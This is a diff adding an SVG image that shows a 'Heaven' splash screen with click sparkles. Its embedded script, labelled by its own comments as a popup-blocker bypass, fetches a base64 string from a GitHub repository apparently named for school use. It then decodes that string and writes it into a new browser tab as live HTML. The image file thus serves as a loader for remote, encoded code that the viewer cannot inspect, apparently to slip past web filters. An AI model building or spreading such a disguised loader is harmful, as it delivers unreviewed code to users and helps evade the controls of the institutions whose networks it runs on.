@@ -1,0 +1,152 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1920 1080" preserveAspectRatio="xMidYMid slice" style="display:block; margin:0 auto; background: #000000;">
+  
+  <defs>
+    <style>
+      @import url('https://fonts.googleapis.com/css2?family=Lobster&amp;family=Inter:wght@300;400;600&amp;display=swap');
+      
+      /* Title styling */
+      .text {
+        font-family: 'Lobster', cursive;
+        font-size: 140px;
+        font-weight: 400;
+        cursor: pointer;
+      }
+
+      /* Instruction text */
+      .instruction {
+        font-family: 'Inter', sans-serif;
+        font-size: 20px;
+        font-weight: 300;
+        letter-spacing: 6px;
+        text-transform: uppercase;
+        fill: #a0a0c0;
+        animation: pulseText 2s infinite ease-in-out;
+      }
+
+      /* Animations */
+      @keyframes pulseText {
+        0% { opacity: 0.4; }
+        50% { opacity: 1; }
+        100% { opacity: 0.4; }
+      }
+
+      /* Sparkle styling */
+      .sparkle {
+        fill: #ffffff;
+        opacity: 0;
+      }
+    </style>
+
+    <!-- Gradient for the title -->
+    <linearGradient id="blueGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+      <stop offset="0%" stop-color="#4a7bc9" />
+      <stop offset="55%" stop-color="#9db8e8" />
+      <stop offset="100%" stop-color="#ffffff" />
+    </linearGradient>
+
+    <!-- Shadow for the title -->
+    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
+      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#000000" flood-opacity="0.9" />
+    </filter>
+  </defs>
+
+  <!-- Background -->
+  <rect width="1920" height="1080" fill="#000000" />
+  
+  <!-- Title (clickable) -->
+  <g onclick="openBase64Tab()" style="cursor: pointer;">
+    <text x="960" y="520" text-anchor="middle" dominant-baseline="middle" class="text" fill="url(#blueGradient)" filter="url(#shadow)">
+      Heaven
+    </text>
+    
+    <!-- Clear instruction below the title (slightly lower, but higher than before) -->
+    <text x="960" y="640" text-anchor="middle" class="instruction">
+      click to enter
+    </text> 
+  </g>
+
+  <!-- Container for Sparkles (only on click) -->
+  <g id="sparkleContainer"></g>
+
+  <!-- Script: UI functionality + Popup Blocker bypass + Sparkles -->
+  <script type="text/javascript">
+    <![CDATA[
+      let pendingTab = null;
+      const SVG_NS = "http://www.w3.org/2000/svg";
+      const container = document.getElementById('sparkleContainer');
+
+      // Generate a random sparkle on click position
+      function createSparkle(x, y) {
+        const sparkle = document.createElementNS(SVG_NS, "circle");
+        const size = Math.random() * 4 + 2; // Random size
+        sparkle.setAttribute("cx", x);
+        sparkle.setAttribute("cy", y);
+        sparkle.setAttribute("r", size);
+        sparkle.setAttribute("class", "sparkle");
+        sparkle.setAttribute("fill", Math.random() > 0.5 ? "#ffffff" : "#9db8e8");
+        sparkle.setAttribute("opacity", "1");
+        
+        // Small animation: sparkle shrinks and fades immediately
+        sparkle.style.transition = "opacity 0.3s ease, r 0.3s ease";
+        
+        container.appendChild(sparkle);
+        
+        // Remove sparkle after 300ms
+        setTimeout(() => {
+          sparkle.style.opacity = "0";
+          sparkle.setAttribute("r", "0");
+          setTimeout(() => sparkle.remove(), 300);
+        }, 300);
+      }
+
+      // Generate sparkles on every click (anywhere on screen)
+      document.addEventListener('click', function(e) {
+        // Convert screen coordinates to SVG coordinates (1920x1080)
+        const svgX = (e.clientX / window.innerWidth) * 1920;
+        const svgY = (e.clientY / window.innerHeight) * 1080;
+        
+        // Create 5 sparkles per click for a nicer effect
+        for (let i = 0; i < 5; i++) {
+          setTimeout(() => createSparkle(svgX + (Math.random() * 20 - 10), svgY + (Math.random() * 20 - 10)), i * 30);
+        }
+      });
+
+      // === POPUP BLOCKER BYPASS ===
+      async function openBase64Tab() {
+        // STEP 1: Open an empty tab directly within the click
+        pendingTab = window.open('', '_blank');
+        
+        if (!pendingTab) {
+          alert('Pop-up blocker is active. Please allow pop-ups for this site.');
+          return;
+        }
+
+        try {
+          // STEP 2: Fetch the base64 string
+          const response = await fetch('https://cdn.jsdelivr.net/gh/nxyder/schoolshi/b64.txt');
+          if (!response.ok) throw new Error('Fetch failed');
+          
+          const htmlBase64 = await response.text();
+
+          if (!htmlBase64 || htmlBase64.trim() === '') {
+            pendingTab.close();
+            alert("Base64 is empty!");
+            return;
+          }
+
+          // STEP 3: Fill the empty tab
+          const decodedHtml = decodeURIComponent(escape(atob(htmlBase64.trim())));
+          pendingTab.document.write(decodedHtml);
+          pendingTab.document.close();
+          pendingTab = null;
+
+        } catch (err) {
+          console.error("Error:", err);
+          pendingTab.document.write('<div style="color:red; font-family:sans-serif; padding:20px;">An error occurred while loading.</div>');
+          pendingTab.document.close();
+          pendingTab = null;
+        }
+      }
+    ]]>
+  </script>
+</svg>
